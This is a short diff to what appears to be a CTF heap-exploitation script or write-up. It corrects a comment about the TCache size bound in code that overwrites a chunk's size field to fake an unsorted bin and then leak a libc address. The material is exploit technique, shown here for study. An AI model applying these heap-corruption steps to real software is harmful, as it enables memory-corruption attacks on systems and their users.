@@ -43,7 +43,7 @@ The size range of TCache is [0x20, 0x410].
 # Step 1: Fake an unsorted bin
 for _ in range(19):
     create(p64(0xdeadbeef00000000 + _) + '\n')  # Create 19 consecutive chunk of 0x40 size, #0 ~ #18
-edit(0, '\x00' * 0x38 + p64(0x40 * 17 + 0x1))   # Write the second chunk's size field to 17 times the original (0x440 > 0x400, enter unsorted bin), leaving the last chunk unmodified
+edit(0, '\x00' * 0x38 + p64(0x40 * 17 + 0x1))   # Write the second chunk's size field to 17 times the original (0x440 > 0x410, enter unsorted bin), leaving the last chunk unmodified
 delete(1)   # Free the fake unsorted bin, #1
 
 # Step 2: Leak LibC address by leaking the `fd` field of unsorted bin
